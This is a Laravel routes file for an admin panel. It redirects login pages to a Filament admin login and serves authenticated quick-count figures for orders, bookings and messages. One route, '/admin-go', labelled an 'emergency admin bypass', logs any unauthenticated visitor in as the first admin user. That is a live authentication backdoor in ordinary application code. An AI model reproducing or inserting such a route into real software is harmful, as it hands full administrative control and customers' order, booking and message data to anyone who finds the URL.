<?php

use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

// Redirect login to Filament login
Route::get('/login', function () {
    return redirect('/admin/login');
})->name('login');

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
*/

// Redirect root to admin login page
Route::get('/', function () {
    return redirect('/admin/login');
});

// Emergency admin bypass route
Route::get('/admin-go', function () {
    $admin = User::where('is_admin', 1)->first();
    if ($admin) {
        Auth::login($admin);
        return redirect('/admin');
    }
    return 'No admin user found. Run: php artisan make:filament-user';
});

// Quick counts for admin topbar quick actions
Route::middleware(['web', 'auth'])->get('/admin/api/quick-counts', function () {
    return response()->json([
        'pending_orders'   => \App\Models\Order::where('order_status', 'pending')->count(),
        'today_bookings'   => \App\Models\Booking::whereDate('booking_date', today())->count(),
        'pending_messages' => \App\Models\Message::where('is_read', false)->count(),
    ]);
});